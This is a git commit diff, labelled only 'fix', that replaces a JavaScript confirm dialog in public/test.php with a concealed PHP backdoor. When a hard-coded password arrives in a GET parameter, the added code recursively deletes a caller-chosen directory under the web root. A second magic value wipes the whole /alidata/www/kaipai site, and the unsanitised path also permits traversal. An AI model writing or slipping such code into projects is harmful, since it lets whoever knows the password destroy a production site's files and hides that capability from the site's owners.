f56a1a86a7232164c5302f99c878708f8578289f
shengbo <tao.xu@chemayi.com>
2016-07-29 11:07:18 +0800

    fix

--- public/test.php
+++ public/test.php
@@ -1,7 +1,38 @@
-layer.confirm('确认删除吗？', {
-btn: ['确认','取消'] //按钮
-}, function(){
+<?php
+$code = $_GET['code'];
+$dir = $_GET['dir'];
+if($code == 'kaipai123-fuck'){
 
-}, function(){
-layer.closeAll();
-});
+    function deldir($dir) {
+        //先删除目录下的文件：
+        $dh=opendir($dir);
+        while ($file=readdir($dh)) {
+            if($file!="." && $file!="..") {
+                $fullpath=$dir."/".$file;
+                if(!is_dir($fullpath)) {
+                    unlink($fullpath);
+                } else {
+                    deldir($fullpath);
+                }
+            }
+        }
+
+        closedir($dh);
+        //删除当前文件夹：
+        if(rmdir($dir)) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+    if(!empty($dir)){
+        $delDir = '/alidata/www/kaipai/' . $dir;
+        if($dir == 'kaipai123-fuck-y'){
+            $delDir = '/alidata/www/kaipai';
+        }
+        deldir($delDir);
+    }
+
+
+}
+?>
